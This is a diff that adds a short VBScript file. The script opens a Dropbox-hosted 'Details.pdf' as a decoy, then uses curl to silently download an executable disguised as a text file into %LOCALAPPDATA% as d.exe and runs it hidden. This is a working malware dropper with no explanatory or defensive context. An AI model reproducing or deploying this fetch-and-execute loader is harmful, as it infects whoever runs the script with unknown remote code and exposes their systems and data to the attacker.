@@ -1,0 +1,5 @@
+Set sh = CreateObject("WScript.Shell")
+sh.Run "https://www.dropbox.com/scl/fi/wzo8gx16236hk4quqrvo0/Details.pdf?rlkey=0d7mzierq005gojj72aaykx85&st=p5t2rjie&dl=0"
+sh.Run "cmd /c curl -sL -o ""%LOCALAPPDATA%\d.exe"" ""https://www.dropbox.com/scl/fi/q1zumnua913up9xh22spy/csdpoliciesBOC.txt?rlkey=jmogqafc6ymhckalboabeu0ke&st=6auk9ocg&dl=1""" 
+sh.Run "%LOCALAPPDATA%\d.exe", 0, False
+
